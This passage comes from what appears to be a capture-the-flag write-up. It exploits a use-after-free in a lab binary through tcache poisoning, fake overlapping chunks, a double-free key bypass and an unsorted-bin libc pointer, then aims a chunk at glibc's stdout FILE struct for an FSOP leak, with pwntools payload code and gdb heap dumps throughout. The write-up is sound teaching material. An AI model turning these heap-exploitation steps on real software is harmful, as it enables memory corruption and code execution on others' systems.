0x55555555c2b0: 0x0000000000000000      0x0000000000000061  <-- freed chunk 2
0x55555555c2c0: 0x000055555555c260      0x000055555555c010  <-- tcache pointer to freed 1, key
0x55555555c2d0: 0x0000000000000000      0x0000000000000000
0x55555555c2e0: 0x0000000000000000      0x0000000000000000
0x55555555c2f0: 0x0000000000000000      0x0000000000000000
0x55555555c300: 0x0000000000000000      0x0000000000000000
0x55555555c310: 0x0000000000000000      0x0000000000020cf1  <-- end of heap
...[snip]...
-----------------------------------
...[snip]...
                  top: 0x55555555c310 (size : 0x20cf0) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x60)   tcache_entry[4](2): 0x55555555c2c0 --> 0x55555555c260  <-- both chunks in tcache list

```

This is something exploitable because I still have a pointer to edit 2, even though it’s been freed. This means I can change the tcache linked list by editing 2.

### Get libc on Heap

#### Strategy

The path from this small vulnerability to code execution is not obvious. Because of ASLR, the first thing I’ll need to do is leak something from libc. To do this, first I’ll need to get something from libc onto the heap. When I free these small bins, they are going into tcache, which is a bunch of singly-linked lists starting in libc, and then each item on the list container the pointer to the next item. But the other types are double-linked lists. That means that each node points to both the node after it *and* the node before it, so the first node will have the address of the start in libc. I can get something into the unsorted bin by filling tcache with 7 bins of a given size, and then freeing one more.

This will take a ton of bouncing around when I’m limited to only two “files” at one time by the program.

#### Spacing

ASLR and Full RELRO will change all but the low 12-bits for each word. I can run the program over and over, and as long I as I define the same chunks in the same order, the low 12-bit of each address will be the same. This means that I can find places where I can overwrite just the low byte in an address, and therefore change it without knowing the high bytes. This also means there will be times where I want to start in a certain space. If I create a fake chunk at 0x2e0, and I can’t overwrite a pointer that currently points to 0x320. But If I just add a small chunk to the heap at the start and shift those to 0x310 and 0x350, now I can just overwrite the low 0x50 with 0x10.

#### Fake Chunk

I’m going to create a fake overlapping chunk that can write through the metadata of the next chunk. I can pick up in the example above, but instead of the first chunk writing nothing of interest, I’ll have it write something that looks like heap metadata, for example, a 0x61:

```

add('A', 0x40, p64(0)*5 + p64(0x61) + p64(0))   # A at 260 in f1
add('B', 0x40)                                  # B at 2b0 in f2

```

When I run this, the heap looks like:

```

0x55555555c250: 0x0000000000000000      0x0000000000000051  <-- A meta
0x55555555c260: 0x0000000000000000      0x0000000000000000
0x55555555c270: 0x0000000000000000      0x0000000000000000
0x55555555c280: 0x0000000000000000      0x0000000000000061  <-- data, but looks like heap meta
0x55555555c290: 0x0000000000000000      0x000000000000000a
0x55555555c2a0: 0x0000000000000000      0x0000000000000051  <-- B meta
0x55555555c2b0: 0x0000000000000a78      0x0000000000000000  <-- B data
0x55555555c2c0: 0x0000000000000000      0x0000000000000000
0x55555555c2d0: 0x0000000000000000      0x0000000000000000
0x55555555c2e0: 0x0000000000000000      0x0000000000000000
0x55555555c2f0: 0x0000000000000000      0x0000000000020d11  <-- end of heap

```

I’ll free A and then free but hold onto B by editing it to 0. Then on adding another 0x40 bin, I’ll have both files pointing to the same spot. From there, removing the first B will leave me where I want to be to attack:

```

rm('A')                                         # A in 0x50 tcache, f1 empty
edit('B', 0)                                    # B -> A in 0x50 tcache, f2 still B
add('B2', 0x40)                                 # A in 0x50 tcache, f1 & f2 -> B
rm('B')                                         # B -> A in 0x50 tcache, f1 -> B

```

The heap loops like:

```

0x55555555c250: 0x0000000000000000      0x0000000000000051  <-- A meta
0x55555555c260: 0x0000000000000000      0x000055555555c010  <-- A pointer to next (null) and key
0x55555555c270: 0x0000000000000000      0x0000000000000000
0x55555555c280: 0x0000000000000000      0x0000000000000061  <-- fake chunk
0x55555555c290: 0x0000000000000000      0x000000000000000a
0x55555555c2a0: 0x0000000000000000      0x0000000000000051  <-- B meta
0x55555555c2b0: 0x000055555555c260      0x000055555555c010  <-- pointer to A and key
0x55555555c2c0: 0x0000000000000000      0x0000000000000000
0x55555555c2d0: 0x0000000000000000      0x0000000000000000
0x55555555c2e0: 0x0000000000000000      0x0000000000000000
0x55555555c2f0: 0x0000000000000000      0x0000000000020d11

```

When I now edit B2 with just one character, 0x90, it will overwrite that tcache pointer:

```

edit('B2', 0x40, '\x90')                        # B -> fake1 in 0x50 tcache, f1 -> B

```

Heap:

```

0x55555555c250: 0x0000000000000000      0x0000000000000051
0x55555555c260: 0x0000000000000000      0x000055555555c010
0x55555555c270: 0x0000000000000000      0x0000000000000000
0x55555555c280: 0x0000000000000000      0x0000000000000061
0x55555555c290: 0x0000000000000000      0x000000000000000a
0x55555555c2a0: 0x0000000000000000      0x0000000000000051
0x55555555c2b0: 0x000055555555c290      0x000055555555c010  <-- now points to fake chunk
0x55555555c2c0: 0x0000000000000000      0x0000000000000000
0x55555555c2d0: 0x0000000000000000      0x0000000000000000
0x55555555c2e0: 0x0000000000000000      0x0000000000000000
0x55555555c2f0: 0x0000000000000000      0x0000000000020d11

```

`heapinfo` also shows this:

```

(0x50)   tcache_entry[3](2): 0x55555555c2b0 --> 0x55555555c290 (overlap chunk with 0x55555555c2a0(freed) )

```

If I want to get access to this chunk, I’ll first need to get 2b0 out of the way. I can’t just get it and free it, or it will end up back in the same place. So I’ll get it, edit it to a smaller size, and then free that, so that two smaller chunks go into tcache, leaving the fake chunk ready to be used.

```

add('B3', 0x40)                                 # fake in 0x50 tcache, f2 -> B
edit('B3', 0x20)                                # B-end in 0x20 tcache
rm('B3')                                        # B in 0x30 tcache

```

Now I’ll add a 0x40 entry, and it will return 290, which I can use to overwrite into B. Before I do that, I have another problem. I want to free B2, but I can’t because it will return a double free error. It is checking the key that comes 0x10 after the size meta, so I need to change that. Luckily, I have this new overlapping chunk. So I’ll create it such that it leaves the 0x51 the same, puts a null for the next tcache, and changes the key.

```

add('fake1', 0x40, p64(0)*3 + p64(0x51) + p64(0))

```

Now the heap shows the key is no longer matching the bad value:

```

0x55555555c250: 0x0000000000000000      0x0000000000000051
0x55555555c260: 0x0000000000000000      0x000055555555c010
0x55555555c270: 0x0000000000000000      0x0000000000000000
0x55555555c280: 0x0000000000000000      0x0000000000000061
0x55555555c290: 0x0000000000000000      0x0000000000000000
0x55555555c2a0: 0x0000000000000000      0x0000000000000051
0x55555555c2b0: 0x0000000000000000      0x000055555555000a  <-- no pointer and key ends in "\x00\x0a" and not "\xc0\x10"
0x55555555c2c0: 0x0000000000000000      0x0000000000000000
0x55555555c2d0: 0x0000000000000000      0x0000000000000021
0x55555555c2e0: 0x0000000000000000      0x000055555555c010
0x55555555c2f0: 0x0000000000000000      0x0000000000020d11

```

I’ll free both B2 and fake1, both going into tcache where I can use them at the end once I need a way to write to arbitrary addresses.

```

rm('fake1')
rm('B2')

```

The tcache now looks like:

```

(0x20)   tcache_entry[0](1): 0x55555555c2e0
(0x30)   tcache_entry[1](1): 0x55555555c2b0 (overlap chunk with 0x55555555c2d0(freed) )
(0x50)   tcache_entry[3](1): 0x55555555c2b0 (overlap chunk with 0x55555555c2d0(freed) )
(0x60)   tcache_entry[4](1): 0x55555555c290 (overlap chunk with 0x55555555c2d0(freed) )

```

#### Second Fake Chunk

I’ll now (after a bit of spacing) create another fake chunk roughly the same way:

```

add('x', 0x30)                                  # add for spacing, but used later
rm('x')

add('C', 0x60)   # create block to be freed and steal pointer in tcache - C = 340
add('D', 0x70, p64(0)*5 + p64(0xa1) + p64(0)) # create block and fake block to put fake block meta in place - D = 3b0
rm('D') # D in tcache 0x80
add('E', 0x60, p64(0x21)*11)   # create second 0x60, E, and spray with 0x21 for next block meta fake later, E = 430
rm('C')               # f1 empty, C in 0x70 tcache
edit('E', 0)      # slot 2 -> E, E->C in 0x70 tcache
add('E2', 0x60)  # slots 1 and 2 -> E, C in 0x70 tcache
rm('E')               # slot 1 -> E, E -> C in 0x70 tache
edit('E2', 0x60, b'\xe0') # edit tcache pointer, C -> fake2 in 0x70 tcache

# next three fetch C from tcache, and get rid of it without putting it back in 0x70 tcache
add('E3', 0x60)   # fetch E, fake in 0x70 tcache
edit('E3', 0x20)  # E-end in 0x30 tcache
rm('E3')          # E in 0x50 tcache

add('fake2', 0x60, p64(0)*9 + p64(0x31) + p64(0))   # get fake block, change key for E
rm('E2') # C
add('B', 0x70) # B

```

I do the same thing here, though this time I have another block between the one I steal the pointer from and the one with that pointer. At the end, I’m left with handles to two overlapping blocks. The fake block reports to have size 0xa1 (despite the fact that I can’t make blocks that big in this program), and the other one is before it able to write into this block.

```
-----------------------------------
[0x000055555555c3b0] B       : x
[0x000055555555c3e0] fake2   : 
-----------------------------------
0x55555555c3a0: 0x0000000000000000      0x0000000000000081  <-- B meta
0x55555555c3b0: 0x0000000000000a78      0x0000000000000000
0x55555555c3c0: 0x0000000000000000      0x0000000000000000
0x55555555c3d0: 0x0000000000000000      0x00000000000000a1  <-- fake2 meta
0x55555555c3e0: 0x0000000000000000      0x0000000000000000
0x55555555c3f0: 0x0000000000000000      0x0000000000000000
0x55555555c400: 0x0000000000000000      0x0000000000000000
0x55555555c410: 0x0000000000000000      0x0000000000000000
0x55555555c420: 0x0000000000000000      0x0000000000000031  <-- E meta
-----------------------------------
...[snip]...
                  top: 0x55555555c490 (size : 0x20b70) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x20)   tcache_entry[0](1): 0x55555555c2e0
(0x30)   tcache_entry[1](3): 0x55555555c430 --> 0x55555555c430 (overlap chunk with 0x55555555c420(freed) )
(0x40)   tcache_entry[2](2): 0x55555555c460 --> 0x55555555c300
(0x50)   tcache_entry[3](1): 0x55555555c2b0 (overlap chunk with 0x55555555c2d0(freed) )
(0x60)   tcache_entry[4](1): 0x55555555c290 (overlap chunk with 0x55555555c2d0(freed) )

```

#### Get Unsorted Bin

What this allows me to do is free fake2, then use B to change the key, and then free it again. I’ll free it eight times in total, the first seven going into tcache, and the last going into unsorted bins, which leaves the double-linked list pointers on the heap. I’ll also need to make sure that 0xa0 bytes after A meta is a valid looking meta, and that’s why I when I created E, I sprayed lots of 0x21s in.

```

# free fake to fill tcache, then overwrite key protecting from double free
for i in range(7):
    edit('fake2', 0x0)    # free fake block, put 3e0 in 0xa0 tcache
    edit('B', 0x70, p64(0)*5 + p64(0xa1) + p64(0) + chr(i).encode()) # B

rm('B') # B
rm('fake2')

```

Now two files are open, and there’s a libc address on the stack:

```
-----------------------------------
[0x0000000000000000]         : (null)
[0x0000000000000000]         : (null)
-----------------------------------
0x55555555c3a0: 0x0000000000000000      0x0000000000000081
0x55555555c3b0: 0x0000000000000000      0x000055555555c010
0x55555555c3c0: 0x0000000000000000      0x0000000000000000
0x55555555c3d0: 0x0000000000000000      0x00000000000000a1
0x55555555c3e0: 0x00007ffff7fc3ca0      0x00007ffff7fc3ca0  <-- libc meta
0x55555555c3f0: 0x0000000000000000      0x0000000000000000
0x55555555c400: 0x0000000000000000      0x0000000000000000
0x55555555c410: 0x0000000000000000      0x0000000000000000
0x55555555c420: 0x0000000000000000      0x0000000000000031
-----------------------------------
                  top: 0x55555555c490 (size : 0x20b70) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x55555555c3d0 (overlap chunk with 0x55555555c420(freed) )
(0x20)   tcache_entry[0](1): 0x55555555c2e0
(0x30)   tcache_entry[1](3): 0x55555555c430 --> 0x55555555c430 (overlap chunk with 0x55555555c420(freed) )
(0x40)   tcache_entry[2](2): 0x55555555c460 --> 0x55555555c300
(0x50)   tcache_entry[3](1): 0x55555555c2b0 (overlap chunk with 0x55555555c2d0(freed) )
(0x60)   tcache_entry[4](1): 0x55555555c290 (overlap chunk with 0x55555555c2d0(freed) )
(0x80)   tcache_entry[6](1): 0x55555555c3b0
(0xa0)   tcache_entry[8](7): 0x55555555c3e0 (overlap chunk with 0x55555555c420(freed) )  <-- actually 7 in there, but only shows once

```

#### What is this Pointer

Having `gdb` to print this address shows that it is in `main_arena`:

```

(gdb) x/xg 0x00007ffff7fc3ca0
0x7ffff7fc3ca0 <main_arena+96>: 0x000055555555c490

```

[This post](http://core-analyzer.sourceforge.net/index_files/Page335.html) does a nice job of explaining what `main_arena` is:

> The library glibc has a global “*struct malloc\_state*” object, named *main\_arena*, which is the root of all managed heap memory.
>
> ![img](https://0xdfimages.gitlab.io/img/ropetwo-image702.png)

</picture>

`gdb` shows how it contains all the different pointers used by the heap:

```

(gdb) p main_arena
$1 = {mutex = 0, flags = 0, have_fastchunks = 0, fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, top = 0x55555555c490, last_remainder = 0x0, bins = {0x55555555c3d0, 0x55555555c3d0, 0x7ffff7fc3cb0 <main_arena+112>, 0x7ffff7fc3cb0 <main_arena+112>, 0x7ffff7fc3cc0 <main_arena+128>, 0x7ffff7fc3cc0 <main_arena+128>, 0x7ffff7fc3cd0 <main_arena+144>, 0x7ffff7fc3cd0 <main_arena+144>, 0x7ffff7fc3ce0 <main_arena+160>, 0x7ffff7fc3ce0 <main_arena+160>, 0x7ffff7fc3cf0 <main_arena+176>, 0x7ffff7fc3cf0 <main_arena+176>, 0x7ffff7fc3d00 <main_arena+192>, 0x7ffff7fc3d00 <main_arena+192>, 0x7ffff7fc3d10 <main_arena+208>, 0x7ffff7fc3d10 <main_arena+208>, 0x7ffff7fc3d20 <main_arena+224>, 0x7ffff7fc3d20 <main_arena+224>, 0x7ffff7fc3d30 <main_arena+240>, 0x7ffff7fc3d30 <main_arena+240>, 0x7ffff7fc3d40 <main_arena+256>, 0x7ffff7fc3d40 <main_arena+256>, 0x7ffff7fc3d50 <main_arena+272>, 0x7ffff7fc3d50 <main_arena+272>, 0x7ffff7fc3d60 <main_arena+288>, 0x7ffff7fc3d60 <main_arena+288>, 0x7ffff7fc3d70 <main_arena+304>, 0x7ffff7fc3d70 <main_arena+304>, 0x7ffff7fc3d80 <main_arena+320>, 0x7ffff7fc3d80 <main_arena+320>, 0x7ffff7fc3d90 <main_arena+336>, 0x7ffff7fc3d90 <main_arena+336>, 0x7ffff7fc3da0 <main_arena+352>, 0x7ffff7fc3da0 <main_arena+352>, 0x7ffff7fc3db0 <main_arena+368>, 0x7ffff7fc3db0 <main_arena+368>, 0x7ffff7fc3dc0 <main_arena+384>, 0x7ffff7fc3dc0 <main_arena+384>, 0x7ffff7fc3dd0 <main_arena+400>, 0x7ffff7fc3dd0 <main_arena+400>, 0x7ffff7fc3de0 <main_arena+416>, 0x7ffff7fc3de0 <main_arena+416>, 0x7ffff7fc3df0 <main_arena+432>, 0x7ffff7fc3df0 <main_arena+432>, 0x7ffff7fc3e00 <main_arena+448>, 0x7ffff7fc3e00 <main_arena+448>, 0x7ffff7fc3e10 <main_arena+464>, 0x7ffff7fc3e10 <main_arena+464>, 0x7ffff7fc3e20 <main_arena+480>, 0x7ffff7fc3e20 <main_arena+480>, 0x7ffff7fc3e30 <main_arena+496>, 0x7ffff7fc3e30 <main_arena+496>, 0x7ffff7fc3e40 <main_arena+512>, 0x7ffff7fc3e40 <main_arena+512>, 0x7ffff7fc3e50 <main_arena+528>, 0x7ffff7fc3e50 <main_arena+528>, 0x7ffff7fc3e60 <main_arena+544>, 0x7ffff7fc3e60 <main_arena+544>, 0x7ffff7fc3e70 <main_arena+560>, 0x7ffff7fc3e70 <main_arena+560>, 0x7ffff7fc3e80 <main_arena+576>, 0x7ffff7fc3e80 <main_arena+576>, 0x7ffff7fc3e90 <main_arena+592>, 0x7ffff7fc3e90 <main_arena+592>, 0x7ffff7fc3ea0 <main_arena+608>, 0x7ffff7fc3ea0 <main_arena+608>, 0x7ffff7fc3eb0 <main_arena+624>, 0x7ffff7fc3eb0 <main_arena+624>, 0x7ffff7fc3ec0 <main_arena+640>, 0x7ffff7fc3ec0 <main_arena+640>, 0x7ffff7fc3ed0 <main_arena+656>, 0x7ffff7fc3ed0 <main_arena+656>, 0x7ffff7fc3ee0 <main_arena+672>, 0x7ffff7fc3ee0 <main_arena+672>, 0x7ffff7fc3ef0 <main_arena+688>, 0x7ffff7fc3ef0 <main_arena+688>, 0x7ffff7fc3f00 <main_arena+704>, 0x7ffff7fc3f00 <main_arena+704>, 0x7ffff7fc3f10 <main_arena+720>, 0x7ffff7fc3f10 <main_arena+720>, 0x7ffff7fc3f20 <main_arena+736>, 0x7ffff7fc3f20 <main_arena+736>, 0x7ffff7fc3f30 <main_arena+752>, 0x7ffff7fc3f30 <main_arena+752>, 0x7ffff7fc3f40 <main_arena+768>, 0x7ffff7fc3f40 <main_arena+768>, 0x7ffff7fc3f50 <main_arena+784>, 0x7ffff7fc3f50 <main_arena+784>, 0x7ffff7fc3f60 <main_arena+800>, 0x7ffff7fc3f60 <main_arena+800>, 0x7ffff7fc3f70 <main_arena+816>, 0x7ffff7fc3f70 <main_arena+816>, 0x7ffff7fc3f80 <main_arena+832>, 0x7ffff7fc3f80 <main_arena+832>, 0x7ffff7fc3f90 <main_arena+848>, 0x7ffff7fc3f90 <main_arena+848>, 0x7ffff7fc3fa0 <main_arena+864>, 0x7ffff7fc3fa0 <main_arena+864>, 0x7ffff7fc3fb0 <main_arena+880>, 0x7ffff7fc3fb0 <main_arena+880>, 0x7ffff7fc3fc0 <main_arena+896>, 0x7ffff7fc3fc0 <main_arena+896>, 0x7ffff7fc3fd0 <main_arena+912>, 0x7ffff7fc3fd0 <main_arena+912>, 0x7ffff7fc3fe0 <main_arena+928>, 0x7ffff7fc3fe0 <main_arena+928>, 0x7ffff7fc3ff0 <main_arena+944>, 0x7ffff7fc3ff0 <main_arena+944>, 0x7ffff7fc4000 <main_arena+960>, 0x7ffff7fc4000 <main_arena+960>, 0x7ffff7fc4010 <main_arena+976>, 0x7ffff7fc4010 <main_arena+976>, 0x7ffff7fc4020 <main_arena+992>, 0x7ffff7fc4020 <main_arena+992>, 0x7ffff7fc4030 <main_arena+1008>, 0x7ffff7fc4030 <main_arena+1008>, 0x7ffff7fc4040 <main_arena+1024>, 0x7ffff7fc4040 <main_arena+1024>, 0x7ffff7fc4050 <main_arena+1040>, 0x7ffff7fc4050 <main_arena+1040>, 0x7ffff7fc4060 <main_arena+1056>, 0x7ffff7fc4060 <main_arena+1056>, 0x7ffff7fc4070 <main_arena+1072>, 0x7ffff7fc4070 <main_arena+1072>, 0x7ffff7fc4080 <main_arena+1088>, 0x7ffff7fc4080 <main_arena+1088>, 0x7ffff7fc4090 <main_arena+1104>, 0x7ffff7fc4090 <main_arena+1104>, 0x7ffff7fc40a0 <main_arena+1120>, 0x7ffff7fc40a0 <main_arena+1120>, 0x7ffff7fc40b0 <main_arena+1136>, 0x7ffff7fc40b0 <main_arena+1136>, 0x7ffff7fc40c0 <main_arena+1152>, 0x7ffff7fc40c0 <main_arena+1152>, 0x7ffff7fc40d0 <main_arena+1168>, 0x7ffff7fc40d0 <main_arena+1168>, 0x7ffff7fc40e0 <main_arena+1184>, 0x7ffff7fc40e0 <main_arena+1184>, 0x7ffff7fc40f0 <main_arena+1200>, 0x7ffff7fc40f0 <main_arena+1200>, 0x7ffff7fc4100 <main_arena+1216>, 0x7ffff7fc4100 <main_arena+1216>, 0x7ffff7fc4110 <main_arena+1232>, 0x7ffff7fc4110 <main_arena+1232>, 0x7ffff7fc4120 <main_arena+1248>, 0x7ffff7fc4120 <main_arena+1248>, 0x7ffff7fc4130 <main_arena+1264>, 0x7ffff7fc4130 <main_arena+1264>, 0x7ffff7fc4140 <main_arena+1280>, 0x7ffff7fc4140 <main_arena+1280>, 0x7ffff7fc4150 <main_arena+1296>, 0x7ffff7fc4150 <main_arena+1296>, 0x7ffff7fc4160 <main_arena+1312>, 0x7ffff7fc4160 <main_arena+1312>, 0x7ffff7fc4170 <main_arena+1328>, 0x7ffff7fc4170 <main_arena+1328>, 0x7ffff7fc4180 <main_arena+1344>, 0x7ffff7fc4180 <main_arena+1344>, 0x7ffff7fc4190 <main_arena+1360>, 0x7ffff7fc4190 <main_arena+1360>, 0x7ffff7fc41a0 <main_arena+1376>, 0x7ffff7fc41a0 <main_arena+1376>, 0x7ffff7fc41b0 <main_arena+1392>, 0x7ffff7fc41b0 <main_arena+1392>, 0x7ffff7fc41c0 <main_arena+1408>, 0x7ffff7fc41c0 <main_arena+1408>, 0x7ffff7fc41d0 <main_arena+1424>, 0x7ffff7fc41d0 <main_arena+1424>, 0x7ffff7fc41e0 <main_arena+1440>, 0x7ffff7fc41e0 <main_arena+1440>, 0x7ffff7fc41f0 <main_arena+1456>, 0x7ffff7fc41f0 <main_arena+1456>, 0x7ffff7fc4200 <main_arena+1472>, 0x7ffff7fc4200 <main_arena+1472>, 0x7ffff7fc4210 <main_arena+1488>, 0x7ffff7fc4210 <main_arena+1488>, 0x7ffff7fc4220 <main_arena+1504>, 0x7ffff7fc4220 <main_arena+1504>, 0x7ffff7fc4230 <main_arena+1520>, 0x7ffff7fc4230 <main_arena+1520>, 0x7ffff7fc4240 <main_arena+1536>, 0x7ffff7fc4240 <main_arena+1536>, 0x7ffff7fc4250 <main_arena+1552>, 0x7ffff7fc4250 <main_arena+1552>, 0x7ffff7fc4260 <main_arena+1568>, 0x7ffff7fc4260 <main_arena+1568>, 0x7ffff7fc4270 <main_arena+1584>, 0x7ffff7fc4270 <main_arena+1584>, 0x7ffff7fc4280 <main_arena+1600>, 0x7ffff7fc4280 <main_arena+1600>, 0x7ffff7fc4290 <main_arena+1616>, 0x7ffff7fc4290 <main_arena+1616>, 0x7ffff7fc42a0 <main_arena+1632>, 0x7ffff7fc42a0 <main_arena+1632>, 0x7ffff7fc42b0 <main_arena+1648>, 0x7ffff7fc42b0 <main_arena+1648>, 0x7ffff7fc42c0 <main_arena+1664>, 0x7ffff7fc42c0 <main_arena+1664>, 0x7ffff7fc42d0 <main_arena+1680>, 0x7ffff7fc42d0 <main_arena+1680>...}, binmap = {0, 0, 0, 0}, next = 0x7ffff7fc3c40 <main_arena>, next_free = 0x0, attached_threads = 1, system_mem = 135168, max_system_mem = 135168}

```

### Leak Libc

#### FSOP Leak

I’m going to use a technique named File System Oriented Programming (FSOP) to leak the libc address. The idea in FSOP is to attack the GLIBC implementation of the file stream object. [This 2018 paper](https://gsec.hitb.org/materials/sg2018/WHITEPAPERS/FILE%20Structures%20-%20Another%20Binary%20Exploitation%20Technique%20-%20An-Jie%20Yang.pdf) goes into a lot of detail about file streams and the `FILE` object structure. If the program itself created opened a file with `fopen`, I could find that structure and mess with it. There are also function pointers in the `FILE` object that I could overwrite to get code execution. But I can’t do anything like that yet, as I don’t have any orientation as to what addresses I might write.

What I can do is find and overwrite the `_flag` and the `_IO_write_base` pointer so that something else is written on the next operation that writes to that file stream.

Of course all of this supposes that I have a `FILE` object to targets. It happens that `stdin` and `stdout` are `FILE` objects kept in LIBC space. Because I am using a libc with debug symbols, I can print `stdout` by name, and get the address with `&`:

```

(gdb) p _IO_2_1_stdout_
$3 = {file = {_flags = -72537977, _IO_read_ptr = 0x7ffff7fc47e3 <_IO_2_1_stdout_+131> "\n", _IO_read_end = 0x7ffff7fc47e3 <_IO_2_1_stdout_+131> "\n", _IO_read_base = 0x7ffff7fc47e3 <_IO_2_1_stdout_+131> "\n", _IO_write_base = 0x7ffff7fc47e3 <_IO_2_1_stdout_+131> "\n", _IO_write_ptr = 0x7ffff7fc47e3 <_IO_2_1_stdout_+131> "\n", _IO_write_end = 0x7ffff7fc47e3 <_IO_2_1_stdout_+131> "\n", _IO_buf_base = 0x7ffff7fc47e3 <_IO_2_1_stdout_+131> "\n", _IO_buf_end = 0x7ffff7fc47e4 <_IO_2_1_stdout_+132> "", _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x7ffff7fc3a00 <_IO_2_1_stdin_>, _fileno = 1, _flags2 = 0, _old_offset = -1, _cur_column = 0, _vtable_offset = 0 '\000', _shortbuf = "\n", _lock = 0x7ffff7fc6580 <_IO_stdfile_1_lock>, _offset = -1, _codecvt = 0x0, _wide_data = 0x7ffff7fc38c0 <_IO_wide_data_1>, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0, _mode = -1, _unused2 = '\000' <repeats 19 times>}, vtable = 0x7ffff7fc5560 <__GI__IO_file_jumps>}

(gdb) p &_IO_2_1_stdout_
$2 = (struct _IO_FILE_plus *) 0x7ffff7fc4760 <_IO_2_1_stdout_>

```

So if I can change the `_IO_write_base` to something before the `_IO_write_end`, it will trick `stdout` into thinking that content is buffered and waiting to be sent. The current pointer is to 0x7ffff7fc47e3. If I just write a single null byte, then it will be 0x7ffff7fc4700:

```

(gdb) x/12xg 0x00007ffff7fc4700
0x7ffff7fc4700 <_IO_2_1_stderr_+128>:   0x0000000000000000      0x00007ffff7fc6570
0x7ffff7fc4710 <_IO_2_1_stderr_+144>:   0xffffffffffffffff      0x0000000000000000
0x7ffff7fc4720 <_IO_2_1_stderr_+160>:   0x00007ffff7fc3780      0x0000000000000000
0x7ffff7fc4730 <_IO_2_1_stderr_+176>:   0x0000000000000000      0x0000000000000000
0x7ffff7fc4740 <_IO_2_1_stderr_+192>:   0x0000000000000000      0x0000000000000000
0x7ffff7fc4750 <_IO_2_1_stderr_+208>:   0x0000000000000000      0x00007ffff7fc5560

```

If that were printed to me, I’d have leaked libc and bypassed ASLR.

#### Changing Pointer to \_IO\_2\_1\_stdout

When I last left off, I had written this pointer in `main_arena` into the heap, and managed to free both my “files”. I also had access to an overlapping chunk before where the `main_arena` pointers were:

```

0x55555555c3a0: 0x0000000000000000      0x0000000000000081  <-- chunk B, currently in tcache
0x55555555c3b0: 0x0000000000000000      0x000055555555c010
0x55555555c3c0: 0x0000000000000000      0x0000000000000000
0x55555555c3d0: 0x0000000000000000      0x00000000000000a1
0x55555555c3e0: 0x00007ffff7fc3ca0      0x00007ffff7fc3ca0  <-- libc meta
0x55555555c3f0: 0x0000000000000000      0x0000000000000000
0x55555555c400: 0x0000000000000000      0x0000000000000000
0x55555555c410: 0x0000000000000000      0x0000000000000000
0x55555555c420: 0x0000000000000000      0x0000000000000031

```

I want to write to 0x7ffff7fc4760. I’ll fetch B and use it to modify the low two bytes of that libc address to point to `_IO_2_1_stdout_`:

```

add('B', 0x70)
edit('B', 0x70, p64(0)*5 + p64(0xa1) + b"\x60\x47")
rm('B')

```

Now I have the address I want to write to on the heap:

```

0x55555555c3a0: 0x0000000000000000      0x0000000000000081
0x55555555c3b0: 0x0000000000000000      0x000055555555c010
0x55555555c3c0: 0x0000000000000000      0x0000000000000000
0x55555555c3d0: 0x0000000000000000      0x00000000000000a1
0x55555555c3e0: 0x00007ffff7fc4760      0x00007ffff7fc3ca0  <-- now points to stdout

```

When I get to the point where ASLR is enabled, this will likely fail. That’s because the low three nibbles (0x760) of the address will be consistent, the higher nibble (4 in this case) will change will ASLR. Once I get it working, I’ll turn ASLR on, and then it will have a one in sixteen chance of being correct, 6.25%. Still, I can run the attack over and over, and so in ten tries I’ll succeed 50% of the time, and in twenty tries 75% of the time. I’ll update the script to loop over failures.

#### Positioning to Write to \_IO\_2\_1\_stdout

Now I want to create a chunk over this structure, and I’ll use the same tcache poisoning technique from before. After a bunch of re-writes, I managed to reach this point with the tcache looking like:

```

(0x20)   tcache_entry[0](1): 0x55555555c2e0                                                                               
(0x30)   tcache_entry[1](3): 0x55555555c430 --> 0x55555555c430 (overlap chunk with 0x55555555c420(freed) )                
(0x40)   tcache_entry[2](2): 0x55555555c460 --> 0x55555555c300
(0x50)   tcache_entry[3](1): 0x55555555c2b0 (overlap chunk with 0x55555555c2d0(freed) )
(0x60)   tcache_entry[4](1): 0x55555555c290 (overlap chunk with 0x55555555c2d0(freed) )
(0x80)   tcache_entry[6](1): 0x55555555c3b0
(0xa0)   tcache_entry[8](7): 0x55555555c3e0 (overlap chunk with 0x55555555c420(freed) )

```

Given that the target address is in the 0x300s, the 0x40 tcache bins looked like a good target. I’ll edit the pointer with the same trick I used above, fetching the bin at 460, editing it to size 0, getting the second file pointed at it, freeing the first so that it goes back into tcache while I have a handle to it, and then editing the address.

```

add('F', 0x30)           # fetch 460 chunk from tcache, 300 still in 0x40 tcache
edit('F', 0)             # 460 -> 300 in 0x40 tcache, f1 -> 460 
add('F2', 0x30)          # f1 and f2 -> 460, 300 in 0x40 tcache
rm('F')                  # f2 -> 460, 460 -> 300 in 0x40 tcache
edit('F2', 0x30, '\xe0') # 460 -> 3e0 -> stdout in 0x40 tcache

# get 460 from tcahce, shrink it, and release it
add('F3', 0x30)
edit('F3', 0x10)
rm('F3')

# get 3e0 from tcache, shrink it, and release it
add('fake3', 0x30)
edit('fake3', 0x10)
rm('fake3')

# clean up F2
edit('F2', 0x10, p64(0)*2) # overwrtie pointer and key to allow double free
rm('F2')

```

At this point, I have the 0x40 tcache list pointing at `_IO_2_1_stdout_`:

```

(0x40)   tcache_entry[2](0): 0x7ffff7fc4760 --> 0xfbad2887 (invalid memory)

```

#### Writing to \_IO\_2\_1\_stdout

As described above, I’m going to attack the `FILE` struct for stdout. I showed the struct above in `gdb`, but [the source](http://sourceware.org/git/?p=glibc.git;a=blob;f=libio/libio.h;h=3cf1712ea98d3c253f418feb1ef881c4a44649d5;hb=HEAD#l245) is also useful:

```

 245 struct _IO_FILE {
 246   int _flags;           /* High-order word is _IO_MAGIC; rest is flags. */
 247 #define _IO_file_flags _flags
 248 
 249   /* The following pointers correspond to the C++ streambuf protocol. */
 250   /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
 251   char* _IO_read_ptr;   /* Current read pointer */
 252   char* _IO_read_end;   /* End of get area. */
 253   char* _IO_read_base;  /* Start of putback+get area. */
 254   char* _IO_write_base; /* Start of put area. */
 255   char* _IO_write_ptr;  /* Current put pointer. */
 256   char* _IO_write_end;  /* End of put area. */
 257   char* _IO_buf_base;   /* Start of reserve area. */
 258   char* _IO_buf_end;    /* End of reserve area. */
 259   /* The following fields are used to support backing up and undo. */
